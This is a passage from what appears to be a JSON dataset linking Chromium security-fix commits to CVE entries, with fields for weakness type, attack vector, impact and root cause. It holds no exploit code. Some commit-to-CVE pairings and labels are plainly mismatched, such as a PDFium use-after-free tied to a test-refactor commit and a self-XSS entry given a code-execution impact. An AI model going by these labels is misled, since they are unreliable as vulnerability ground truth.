<jshin@chromium.org>\nReviewed-by: Eric Lawrence <elawrence@chromium.org>\nReviewed-by: Peter Kasting <pkasting@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#529129}","summary":"Incorrect handling of confusable characters in Omnibox in Google Chrome prior to 65.0.3325.146 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted domain name.","commit_message_1":"add more confusable character map entry when comparing domain name with top 10k domain name for confusability , character with diacritic are decomposed into base + diacritic mark ( unicode normalization form d ) and diacritic are dropped before calculating the confusability skeleton because two character with and without a diacritic is not regarded a confusable","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted domain name","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"d128139d53e9268e87921e82d89b3f2053cb83fd","cve_id":"CVE-2018-6079","cwe_id":"CWE-200","commit_message":"Fix tabs sharing TEXTURE_2D_ARRAY\/TEXTURE_3D data.\n\nIn linux and android, we are seeing an issue where texture data from one\ntab overwrites the texture data of another tab. This is happening for apps\nwhich are using webgl2 texture of type TEXTURE_2D_ARRAY\/TEXTURE_3D.\nDue to a bug in virtual context save\/restore code for above texture formats,\nthe texture data is not properly restored while switching tabs. Hence\ntexture data from one tab overwrites other.\n\nThis CL has fix for that issue, an update for existing test expectations\nand a new unit test for this bug.\n\n\nBug: 788448\nCq-Include-Trybots: master.tryserver.chromium.android:android_optional_gpu_tests_rel;master.tryserver.chromium.linux:linux_optional_gpu_tests_rel;master.tryserver.chromium.mac:mac_optional_gpu_tests_rel;master.tryserver.chromium.win:win_optional_gpu_tests_rel\nChange-Id: Ie933984cdd2d1381f42eb4638f730c8245207a28\nReviewed-on: https:\/\/chromium-review.googlesource.com\/930327\nReviewed-by: Zhenyao Mo <zmo@chromium.org>\nCommit-Queue: vikas soni <vikassoni@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#539111}","summary":"Inappropriate sharing of TEXTURE_2D_ARRAY\/TEXTURE_3D data between tabs in WebGL in Google Chrome prior to 65.0.3325.146 allowed a remote attacker to leak cross-origin data via a crafted HTML page.","commit_message_1":"fix tab sharing texture_2d_array\/texture_3d data","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted html page","Impact":"leak cross - origin data","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"b44e68087804e6543a99c87076ab7648d11d9b07","cve_id":"CVE-2018-6080","cwe_id":"CWE-269","commit_message":"memory-infra: split up memory-infra coordinator service into two\n\nThis allows for heap profiler to use its own service with correct\ncapabilities and all other instances to use the existing coordinator\nservice.\n\nBug: 792028\nChange-Id: I84e4ec71f5f1d00991c0516b1424ce7334bcd3cd\nReviewed-on: https:\/\/chromium-review.googlesource.com\/836896\nCommit-Queue: Lalit Maganti <lalitm@chromium.org>\nReviewed-by: Daniel Cheng <dcheng@chromium.org>\nReviewed-by: oysteine <oysteine@chromium.org>\nReviewed-by: Albert J. Wong <ajwong@chromium.org>\nReviewed-by: Hector Dearman <hjd@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#529059}","summary":"Lack of access control checks in Instrumentation in Google Chrome prior to 65.0.3325.146 allowed a remote attacker who had compromised the renderer process to obtain memory metadata from privileged processes .","commit_message_1":"split up memory-infra coordinator service into two this allows for heap profiler to use it own service with correct capability and all other instance to use the existing coordinator service","Vulnerability Type":"Improper Privilege Management","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"obtain memory metadata from privileged processes .","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"112756ed920162dcb74660b0bed57a3f559710c8","cve_id":"CVE-2018-6082","cwe_id":"CWE-200","commit_message":"Remove port 22 from the set of allowed FTP ports.\n\nThe collision with SSH ports caused some possible concerns with being\nable to enumerate internal hosts. Analysis shows that Internet hosts\nsupporting FTP over port 22 are a small fraction, and likely not\naccessed over the web.\n\nBug: 767354\nChange-Id: I8958b4cc818b34127fd739d2dea58f498fb073c0\nReviewed-on: https:\/\/chromium-review.googlesource.com\/860753\nReviewed-by: Matt Menke <mmenke@chromium.org>\nCommit-Queue: Christopher Thompson <cthomp@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#528461}","summary":"Including port 22 in the list of allowed FTP ports in Networking in Google Chrome prior to 65.0.3325.146 allowed a remote attacker to potentially enumerate internal host services via a crafted HTML page.","commit_message_1":"remove port <number> from the set of allowed ftp port","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted html page","Impact":"potentially enumerate internal host services","Root Cause":"Including port 22","Attack Type":"remote attacker"},{"commit_id":"ffac0ee4b8b00944e2ddf23f7f4f55daff3c117e","cve_id":"CVE-2018-6083","cwe_id":null,"commit_message":"Fail the web app manifest fetch if the document is sandboxed.\n\nThis ensures that sandboxed pages are regarded as non-PWAs, and that\nother features in the browser process which trust the web manifest do\nnot receive the manifest at all if the document itself cannot access the\nmanifest.\n\nBUG=771709\n\nChange-Id: Ifd4d00c2fccff8cc0e5e8d2457bd55b992b0a8f4\nReviewed-on: https:\/\/chromium-review.googlesource.com\/866529\nCommit-Queue: Dominick Ng <dominickn@chromium.org>\nReviewed-by: Mounir Lamouri <mlamouri@chromium.org>\nReviewed-by: Mike West <mkwst@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#531121}","summary":"Failure to disallow PWA installation from CSP sandboxed pages in AppManifest in Google Chrome prior to 65.0.3325.146 allowed a remote attacker to access privileged APIs via a crafted HTML page.","commit_message_1":"fail the web app manifest fetch if the document is sandboxed","Vulnerability Type":"incorrect handling","Attack Vector":"via a crafted html page","Impact":"access privileged apis","Root Cause":"Failure to disallow PWA installation","Attack Type":"remote attacker"},{"commit_id":"a96567f02a0881561c964e5c11afe9c1af17a5f7","cve_id":"CVE-2017-15407","cwe_id":"CWE-787","commit_message":"Fix OOB Write in QuicStreamSequencerBuffer::OnStreamData\n\nBUG=778505\n\nCq-Include-Trybots: master.tryserver.chromium.android:android_cronet_tester;master.tryserver.chromium.mac:ios-simulator-cronet\nChange-Id: I1dfd1d26a2c7ee8fe047f7fe6e4ac2e9b97efa52\nReviewed-on: https:\/\/chromium-review.googlesource.com\/748282\nCommit-Queue: Ryan Hamilton <rch@chromium.org>\nReviewed-by: Zhongyi Shi <zhongyi@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#513144}","summary":"Out-of-bounds Write in the QUIC networking stack in Google Chrome prior to 63.0.3239.84 allowed a remote attacker to gain code execution via a malicious server.","commit_message_1":"fix oob write in quicstreamsequencerbuffer : :onstreamdata","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"via a malicious server","Impact":"gain code execution","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"9d81094d7b0bfc8be6bba2f5084e790677e527c8","cve_id":"CVE-2017-15411","cwe_id":"CWE-416","commit_message":"[Reland #1] Add Android OOP HP end-to-end tests.\n\nThe original CL added a javatest and its dependencies to the apk_under_test.\nThis causes the dependencies to be stripped from the instrumentation_apk, which\ncauses issue. This CL updates the build configuration so that the javatest and\nits dependencies are only added to the instrumentation_apk.\n\nThis is a reland of e0b4355f0651adb1ebc2c513dc4410471af712f5\nOriginal change's description:\n> Add Android OOP HP end-to-end tests.\n>\n> This CL has three components:\n>   1) The bulk of the logic in OOP HP was refactored into ProfilingTestDriver.\n>   2) Adds a java instrumentation test, along with a JNI shim that forwards into\n>   ProfilingTestDriver.\n>   3) Creates a new apk: chrome_public_apk_for_test that contains the same\n>   content as chrome_public_apk, as well as native files needed for (2).\n>   chrome_public_apk_test now targets chrome_public_apk_for_test instead of\n>   chrome_public_apk.\n>\n> Other ideas, discarded:\n>   * Originally, I attempted to make the browser_tests target runnable on\n>   Android. The primary problem is that native test harness cannot fork\n>   or spawn processes. This is difficult to solve.\n>\n> More details on each of the components:\n> (1) ProfilingTestDriver\n>   * The TracingController test was migrated to use ProfilingTestDriver, but the\n>   write-to-file test was left as-is. The latter behavior will likely be phased\n>   out, but I'll clean that up in a future CL.\n>   * gtest isn't supported for Android instrumentation tests. ProfilingTestDriver\n>   has a single function RunTest that returns a 'bool' indicating success. On\n>   failure, the class uses LOG(ERROR) to print the nature of the error. This will\n>   cause the error to be printed out on browser_test error. On instrumentation\n>   test failure, the error will be forwarded to logcat, which is available on all\n>   infra bot test runs.\n> (2) Instrumentation test\n>   * For now, I only added a single test for the \"browser\" mode. Furthermore, I'm\n>   only testing the start with command-line path.\n> (3) New apk\n>   * libchromefortest is a new shared library that contains all content from\n>   libchrome, but also contains native sources for the JNI shim.\n>   * chrome_public_apk_for_test is a new apk that contains all content from\n>   chrome_public_apk, but uses a single shared library libchromefortest rather\n>   than libchrome. This also contains java sources for the JNI shim.\n>   * There is no way to just add a second shared library to chrome_public_apk\n>   that just contains the native sources from the JNI shim without causing ODR\n>   issues.\n>   * chrome_public_test_apk now has apk_under_test = chrome_public_apk_for_test.\n>   * There is no way to add native JNI sources as a shared library to\n>   chrome_public_test_apk without causing ODR issues.\n>\n> Finally, this CL drastically increases the timeout to wait for native\n> initialization. The previous timeout was 2 *\n> CriteriaHelper.DEFAULT_MAX_TIME_TO_POLL, which flakily failed for this test.\n> This suggests that this step\/timeout is generally flaky. I increased the timeout\n> to 20 * CriteriaHelper.DEFAULT_MAX_TIME_TO_POLL.\n>\n> Bug: 753218\n> Change-Id: Ic224b7314fff57f1770a4048aa5753f54e040b55\n> Reviewed-on: https:\/\/chromium-review.googlesource.com\/770148\n> Commit-Queue: Erik Chen <erikchen@chromium.org>\n> Reviewed-by: John Budorick <jbudorick@chromium.org>\n> Reviewed-by: Brett Wilson <brettw@chromium.org>\n> Cr-Commit-Position: refs\/heads\/master@{#517541}\n\nBug: 753218\nTBR: brettw@chromium.org\nChange-Id: Ic6aafb34c2467253f75cc85da48200d19f3bc9af\nReviewed-on: https:\/\/chromium-review.googlesource.com\/777697\nCommit-Queue: Erik Chen <erikchen@chromium.org>\nReviewed-by: John Budorick <jbudorick@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#517850}","summary":"Use after free in PDFium in Google Chrome prior to 63.0.3239.84 allowed a remote attacker to potentially exploit heap corruption via a crafted PDF file.","commit_message_1":"add android oop hp end-to-end test","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted pdf file","Impact":"potentially exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"dc5edc9c05901feeac616c075d0337e634f3a02a","cve_id":"CVE-2017-15415","cwe_id":"CWE-119","commit_message":"Serialize struct tm in a safe way.\n\nBUG=765512\n\nChange-Id: If235b8677eb527be2ac0fe621fc210e4116a7566\nReviewed-on: https:\/\/chromium-review.googlesource.com\/679441\nCommit-Queue: Chris Palmer <palmer@chromium.org>\nReviewed-by: Julien Tinnes <jln@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#503948}","summary":"Incorrect serialization in IPC in Google Chrome prior to 63.0.3239.84 allowed a remote attacker to leak the value of a pointer via a crafted HTML page.","commit_message_1":"serialize struct tm in a safe way","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted html page","Impact":"leak the value of a pointer","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"11bd4bc92f3fe704631e3e6ad1dd1a4351641f7c","cve_id":"CVE-2017-15416","cwe_id":"CWE-119","commit_message":"[BlobStorage] Fixing potential overflow\n\nBug: 779314\nChange-Id: I74612639d20544e4c12230569c7b88fbe669ec03\nReviewed-on: https:\/\/chromium-review.googlesource.com\/747725\nReviewed-by: Victor Costan <pwnall@chromium.org>\nCommit-Queue: Daniel Murphy <dmurph@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#512977}","summary":"Heap buffer overflow in Blob API in Google Chrome prior to 63.0.3239.84 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page, aka a Blink out-of-bounds read.","commit_message_1":"fixing potential overflow","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted html page , aka a blink out - of - bounds read ","Impact":"potentially exploit heap corruption","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"fa17c9878dbeebf991b25ac0deb2b4635d85f1b6","cve_id":"CVE-2017-15419","cwe_id":"CWE-601","commit_message":"Resource Timing: Do not report subsequent navigations within subframes\n\nWe only want to record resource timing for the load that was initiated\nby parent document. We filter out subsequent navigations for <iframe>,\nbut we should do it for other types of subframes too.\n\nBug: 780312\nChange-Id: I3a7b9e1a365c99e24bb8dac190e88c7099fc3da5\nReviewed-on: https:\/\/chromium-review.googlesource.com\/750487\nReviewed-by: Nate Chapin <japhet@chromium.org>\nCommit-Queue: Kunihiko Sakamoto <ksakamoto@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#513665}","summary":"Insufficient policy enforcement in Resource Timing API in Google Chrome prior to 63.0.3239.84 allowed a remote attacker to infer browsing history by triggering a leaked cross-origin URL via a crafted HTML page.","commit_message_1":"do not report subsequent navigation within subframes we only want to record resource timing for the load that wa initiated by parent document","Vulnerability Type":"Open Redirect","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"obtain sensitive information disclosure","Root Cause":"caused by a cross origin leak of redirect URL","Attack Type":"remote attacker"},{"commit_id":"56a84aa67bb071a33a48ac1481b555c48e0a9a59","cve_id":"CVE-2017-15420","cwe_id":"CWE-20","commit_message":"Do not use NavigationEntry to block history navigations.\n\nThis is no longer necessary after r477371.\n\nBUG=777419\nTEST=See bug for repro steps.\n\nCq-Include-Trybots: master.tryserver.chromium.linux:linux_site_isolation\nChange-Id: I701e4d4853858281b43e3743b12274dbeadfbf18\nReviewed-on: https:\/\/chromium-review.googlesource.com\/733959\nReviewed-by: Devlin <rdevlin.cronin@chromium.org>\nReviewed-by: Nasko Oskov <nasko@chromium.org>\nCommit-Queue: Charlie Reis <creis@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#511942}","summary":"Incorrect handling of back navigations in error pages in Navigation in Google Chrome prior to 63.0.3239.84 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted HTML page.","commit_message_1":"do not use navigationentry to block history navigation","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"a263d1cf62a9c75be6aaafdec88aacfcef1e8fd2","cve_id":"CVE-2017-15423","cwe_id":"CWE-310","commit_message":"Roll src\/third_party\/boringssl\/src 664e99a64..696c13bd6\n\nhttps:\/\/boringssl.googlesource.com\/boringssl\/+log\/664e99a6486c293728097c661332f92bf2d847c6..696c13bd6ab78011adfe7b775519c8b7cc82b604\n\nBUG=778101\n\nChange-Id: I8dda4f3db952597148e3c7937319584698d00e1c\nReviewed-on: https:\/\/chromium-review.googlesource.com\/747941\nReviewed-by: Avi Drissman <avi@chromium.org>\nReviewed-by: David Benjamin <davidben@chromium.org>\nCommit-Queue: Steven Valdez <svaldez@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#513774}","summary":"Inappropriate implementation in BoringSSL SPAKE2 in Google Chrome prior to 63.0.3239.84 allowed a remote attacker to leak the low-order bits of SHA512(password) by inspecting protocol traffic.","commit_message_1":"roll src\/third_party\/boringssl\/src 664e99a64","Vulnerability Type":"Cryptographic Issues","Attack Vector":"by inspecting protocol traffic","Impact":"leak the low - order bits of sha512 ( password )","Root Cause":"the SPAKE implementation","Attack Type":"remote attacker"},{"commit_id":"fd34ee82420c5e5cb04459d6e381944979d8e571","cve_id":"CVE-2017-15424","cwe_id":"CWE-20","commit_message":"Change the script mixing policy to highly restrictive\n\nThe current script mixing policy (moderately restricitive) allows\nmixing of Latin-ASCII and one non-Latin script (unless the non-Latin\nscript is Cyrillic or Greek).\n\nThis CL tightens up the policy to block mixing of Latin-ASCII and\na non-Latin script unless the non-Latin script is Chinese (Hanzi,\nBopomofo), Japanese (Kanji, Hiragana, Katakana) or Korean (Hangul,\nHanja).\n\nMajor gTLDs (.net\/.org\/.com) do not allow the registration of\na domain that has both Latin and a non-Latin script. The only\nexception is names with Latin + Chinese\/Japanese\/Korean scripts.\nThe same is true of ccTLDs with IDNs.\n\nGiven the above registration rules of major gTLDs and ccTLDs, allowing\nmixing of Latin and non-Latin other than CJK has no practical effect. In\nthe meantime, domain names in TLDs with a laxer policy on script mixing\nwould be subject to a potential spoofing attempt with the current\nmoderately restrictive script mixing policy. To protect users from those\nrisks, there are a few ad-hoc rules in place.\n\nBy switching to highly restrictive those ad-hoc rules can be removed\nsimplifying the IDN display policy implementation a bit.\n\nThis is also coordinated with Mozilla. See\nhttps:\/\/bugzilla.mozilla.org\/show_bug.cgi?id=1399939 .\n\nBUG=726950, 756226, 756456, 756735, 770465\nTEST=components_unittests --gtest_filter=*IDN*\n\nChange-Id: Ib96d0d588f7fcda38ffa0ce59e98a5bd5b439116\nReviewed-on: https:\/\/chromium-review.googlesource.com\/688825\nReviewed-by: Brett Wilson <brettw@chromium.org>\nReviewed-by: Lucas Garron <lgarron@chromium.org>\nCommit-Queue: Jungshik Shin <jshin@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#506561}","summary":"Insufficient policy enforcement in Omnibox in Google Chrome prior to 63.0.3239.84 allowed a remote attacker to perform domain spoofing via IDN homographs in a crafted domain name.","commit_message_1":"change the script mixing policy to highly restrictive the current script mixing policy ( moderately restricitive ) allows mixing of latin-ascii and one non-latin script ( unless the non-latin script is cyrillic or greek )","Vulnerability Type":"Improper Input Validation","Attack Vector":"via idn homographs in a crafted domain name","Impact":"perform domain spoofing","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"16c719e0e275d2ee5d5c69e4962b744bcaf0fe40","cve_id":"CVE-2017-15427","cwe_id":"CWE-79","commit_message":"Strip JavaScript schemas on Linux text drop\n\nWhen dropping text onto the Omnibox, any leading JavaScript schemes\nshould be stripped to avoid a \"self-XSS\" attack. This stripping already\noccurs in all cases except when plaintext is dropped on Linux. This CL\ncorrects that oversight.\n\nBug: 768910\nChange-Id: I43af24ace4a13cf61d15a32eb9382dcdd498a062\nReviewed-on: https:\/\/chromium-review.googlesource.com\/685638\nReviewed-by: Justin Donnelly <jdonnelly@chromium.org>\nCommit-Queue: Eric Lawrence <elawrence@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#504695}","summary":"Insufficient policy enforcement in Omnibox in Google Chrome prior to 63.0.3239.84 allowed a socially engineered user to XSS themselves by dragging and dropping a javascript: URL into the URL bar.","commit_message_1":"strip javascript schema on linux text drop when dropping text onto the omnibox , any leading javascript scheme should be stripped to avoid a `` self-xss '' attack","Vulnerability Type":"Cross-site Scripting","Attack Vector":"by dragging and dropping a javascript : url into the url bar","Impact":"execute arbitrary code on the system or cause a denial of service","Root Cause":"caused by insufficient blocking of JavaScript","Attack Type":"remote attacker"},{"commit_id":"7a6484fa7b7f86ea06749bfc9d10bb67b145140b","cve_id":"CVE-2017-15398","cwe_id":"CWE-119","commit_message":"Fix Stack Buffer Overflow in QuicClientPromisedInfo::OnPromiseHeaders\n\nBUG=777728\n\nCq-Include-Trybots: master.tryserver.chromium.android:android_cronet_tester;master.tryserver.chromium.mac:ios-simulator-cronet\nChange-Id: I6a80db88aafdf20c7abd3847404b818565681310\nReviewed-on: https:\/\/chromium-review.googlesource.com\/748425\nReviewed-by: Zhongyi Shi <zhongyi@chromium.org>\nCommit-Queue: Ryan Hamilton <rch@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#513105}","summary":"A stack buffer overflow in the QUIC networking stack in Google Chrome prior to 62.0.3202.89 allowed a remote attacker to gain code execution via a malicious server.","commit_message_1":"fix stack buffer overflow in quicclientpromisedinfo : :onpromiseheaders","Vulnerability Type":"buffer overflow","Attack Vector":"via a malicious server","Impact":"gain code execution","Root Cause":"caused by improper bounds checking by QUIC","Attack Type":"remote attacker"},{"commit_id":"1a90b2996bfd341a04073f0054047073865b485d","cve_id":"CVE-2017-5125","cwe_id":"CWE-119","commit_message":"Remove some senseless indirection from the Push API code\n\nFour files to call one Java function. Let's just call it directly.\n\nBUG=\n\nChange-Id: I6e988e9a000051dd7e3dd2b517a33a09afc2fff6\nReviewed-on: https:\/\/chromium-review.googlesource.com\/749147\nReviewed-by: Anita Woodruff <awdf@chromium.org>\nCommit-Queue: Peter Beverloo <peter@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#513464}","summary":"Heap buffer overflow in Skia in Google Chrome prior to 62.0.3202.62 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"remove some senseless indirection from the push api code four file to call one java function","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by improper bounds checking by Skia","Attack Type":"remote attacker"},{"commit_id":"783c28d59c4c748ef9b787d4717882c90c5b227b","cve_id":"CVE-2017-5129","cwe_id":"CWE-416","commit_message":"Keep ScriptProcessorHandler alive across threads\n\nWhen posting a task from the ScriptProcessorHandler::Process to fire a\nprocess event, we need to keep the handler alive in case the\nScriptProcessorNode goes away (because it has no onaudioprocess\nhandler) and removes the its handler.\n\nBug: 765495\nTest: \nChange-Id: Ib4fa39d7b112c7051897700a1eff9f59a4a7a054\nReviewed-on: https:\/\/chromium-review.googlesource.com\/677137\nReviewed-by: Hongchan Choi <hongchan@chromium.org>\nReviewed-by: Kentaro Hara <haraken@chromium.org>\nCommit-Queue: Raymond Toy <rtoy@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#503629}","summary":"A use after free in WebAudio in Blink in Google Chrome prior to 62.0.3202.62 allowed a remote attacker to perform an out of bounds memory read via a crafted HTML page.","commit_message_1":"keep scriptprocessorhandler alive across thread when posting a task from the scriptprocessorhandler : :process to fire a process event , we need to keep the handler alive in case the scriptprocessornode go away ( because it ha no onaudioprocess handler ) and remove the it handler","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"perform an out of bounds memory read","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"ba3b1b344017bbf36283464b51014fad15c2f3f4","cve_id":"CVE-2017-15386","cwe_id":"CWE-20","commit_message":"If a page shows a popup, end fullscreen.\n\nThis was implemented in Blink r159834, but it is susceptible\nto a popup\/fullscreen race. This CL reverts that implementation\nand re-implements it in WebContents.\n\nBUG=752003\nTEST=WebContentsImplBrowserTest.PopupsFromJavaScriptEndFullscreen\n\nChange-Id: Ia345cdeda273693c3231ad8f486bebfc3d83927f\nReviewed-on: https:\/\/chromium-review.googlesource.com\/606987\nCommit-Queue: Avi Drissman <avi@chromium.org>\nReviewed-by: Charlie Reis <creis@chromium.org>\nReviewed-by: Philip J\u00e4genstedt <foolip@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#498171}","summary":"Incorrect implementation in Blink in Google Chrome prior to 62.0.3202.62 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted HTML page.","commit_message_1":"if a page show a popup , end fullscreen","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"7d803fd8bbb8a2f3b626851a5ce58244efa0798a","cve_id":"CVE-2017-15387","cwe_id":null,"commit_message":"CSP now prevents opening javascript url windows when they're not allowed\n\nspec: https:\/\/html.spec.whatwg.org\/#navigate\nwhich leads to: https:\/\/w3c.github.io\/webappsec-csp\/#should-block-navigation-request\n\nBug: 756040\nChange-Id: I5fd62ebfb6fe1d767694b0ed6cf427c8ea95994a\nReviewed-on: https:\/\/chromium-review.googlesource.com\/632580\nReviewed-by: Mike West <mkwst@chromium.org>\nCommit-Queue: Andy Paicu <andypaicu@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#497338}","summary":"Insufficient enforcement of Content Security Policy in Blink in Google Chrome prior to 62.0.3202.62 allowed a remote attacker to open javascript: URL windows when they should not be allowed to via a crafted HTML page.","commit_message_1":"csp now prevents opening javascript url window when they 're not allowed spec : http : \/\/<file>","Vulnerability Type":"Insufficient enforcement","Attack Vector":"via a crafted html page","Impact":"open javascript : url windows when they should not be allowed to","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"5788690fb1395dc672ff9b3385dbfb1180ed710a","cve_id":"CVE-2017-15389","cwe_id":"CWE-20","commit_message":"mac: Make RWHVMac::ClearCompositorFrame clear locks\n\nEnsure that the BrowserCompositorMac not hold on to a compositor lock\nwhen requested to clear its compositor frame. This lock may be held\nindefinitely (if the renderer hangs) and so the frame will never be\ncleared.\n\nBug: 739621\nChange-Id: I15d0e82bdf632f3379a48e959f198afb8a4ac218\nReviewed-on: https:\/\/chromium-review.googlesource.com\/608239\nCommit-Queue: ccameron chromium <ccameron@chromium.org>\nReviewed-by: Ken Buchanan <kenrb@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#493563}","summary":"An insufficient watchdog timer in navigation in Google Chrome prior to 62.0.3202.62 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted HTML page.","commit_message_1":"make rwhvmac : :clearcompositorframe clear lock ensure that the browsercompositormac not hold on to a compositor lock when requested to clear it compositor frame","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"1f6acd54ee3765d5c1a6f14fc31ddd4a74145314","cve_id":"CVE-2017-15390","cwe_id":"CWE-20","commit_message":"IDN display: Block U+0307 after i or U+0131\n\nU+0307 (dot above) after i, j, l, or U+0131 (dotless i) would be\nvery hard to see if possible at all. This is not blocked\nby the 'repeated diacritic' check because i is not decomposed\ninto dotless-i + U+0307. So, it has to be blocked separately.\n\nAlso, change the indentation in the output of\nidn_test_case_generator.py .\n\nThis change blocks 80+ domains out of a million IDNs in .com TLD.\n\nBUG=750239\nTEST=components_unittests --gtest_filter=*IDN*\n\nChange-Id: I4950aeb7aa080f92e38a2b5dea46ef4e5c25b65b\nReviewed-on: https:\/\/chromium-review.googlesource.com\/607907\nReviewed-by: Peter Kasting <pkasting@chromium.org>\nReviewed-by: Tom Sepez <tsepez@chromium.org>\nReviewed-by: Matt Giuca <mgiuca@chromium.org>\nCommit-Queue: Jungshik Shin <jshin@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#502987}","summary":"Insufficient Policy Enforcement in Omnibox in Google Chrome prior to 62.0.3202.62 allowed a remote attacker to perform domain spoofing via IDN homographs in a crafted domain name.","commit_message_1":"block u+<number> after i or u+<number> u+<number> ( dot above ) after i , j , l , or u+<number> ( dotless i ) would be very hard to see if possible at all","Vulnerability Type":"Improper Input Validation","Attack Vector":"via idn homographs in a crafted domain name","Impact":"perform domain spoofing","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"f1afce25b3f94d8bddec69b08ffbc29b989ad844","cve_id":"CVE-2017-15391","cwe_id":null,"commit_message":"[Extensions] Update navigations across hypothetical extension extents\n\nUpdate code to treat navigations across hypothetical extension extents\n(e.g. for nonexistent extensions) the same as we do for navigations\ncrossing installed extension extents.\n\nBug: 598265\n\nChange-Id: Ibdf2f563ce1fd108ead279077901020a24de732b\nReviewed-on: https:\/\/chromium-review.googlesource.com\/617180\nCommit-Queue: Devlin <rdevlin.cronin@chromium.org>\nReviewed-by: Alex Moshchuk <alexmos@chromium.org>\nReviewed-by: Nasko Oskov <nasko@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#495779}","summary":"Insufficient Policy Enforcement in Extensions in Google Chrome prior to 62.0.3202.62 allowed a remote attacker to access Extension pages without authorisation via a crafted HTML page.","commit_message_1":"update navigation across hypothetical extension extent update code to treat navigation across hypothetical extension extent ( <file>","Vulnerability Type":"Insufficient Policy Enforcement","Attack Vector":"via a crafted html page","Impact":"access extension pages without authorisation","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"a8ef19900d003ff7078fe4fcec8f63496b18f0dc","cve_id":"CVE-2017-15393","cwe_id":"CWE-668","commit_message":"[DevTools] Use no-referrer for DevTools links\n\nBug: 732751\nChange-Id: I77753120e2424203dedcc7bc0847fb67f87fe2b2\nReviewed-on: https:\/\/chromium-review.googlesource.com\/615021\nReviewed-by: Andrey Kosyakov <caseq@chromium.org>\nCommit-Queue: Dmitry Gozman <dgozman@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#494413}","summary":"Insufficient Policy Enforcement in Devtools remote debugging in Google Chrome prior to 62.0.3202.62 allowed a remote attacker to obtain access to remote debugging functionality via a crafted HTML page, aka a Referer leak.","commit_message_1":"use no-referrer for devtools link","Vulnerability Type":"Exposure of Resource to Wrong Sphere","Attack Vector":"via a crafted html page , aka a referer leak .","Impact":"obtain access to remote debugging functionality","Root Cause":"caused by a referrer leak","Attack Type":"remote attacker"},{"commit_id":"504e0c45030f76bffda93f0857e7595216d6e7a4","cve_id":"CVE-2017-15394","cwe_id":"CWE-20","commit_message":"Ensure IDN domains are in punycode format in extension host permissions\n\nToday in extension dialogs and bubbles, IDN domains in host permissions\nare not displayed in punycode format. There is a low security risk that\ngranting such permission would allow extensions to interact with pages\nusing spoofy IDN domains. Note that this does not affect the omnibox,\nwhich would represent the origin properly.\n\nTo address this issue, this CL converts IDN domains in host permissions\nto punycode format.\n\n\nBug: 745580\nChange-Id: Ifc04030fae645f8a78ac8fde170660f2d514acce\nReviewed-on: https:\/\/chromium-review.googlesource.com\/644140\nCommit-Queue: catmullings <catmullings@chromium.org>\nReviewed-by: Istiaque Ahmed <lazyboy@chromium.org>\nReviewed-by: Tommy Li <tommycli@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#499090}","summary":"Insufficient Policy Enforcement in Extensions in Google Chrome prior to 62.0.3202.62 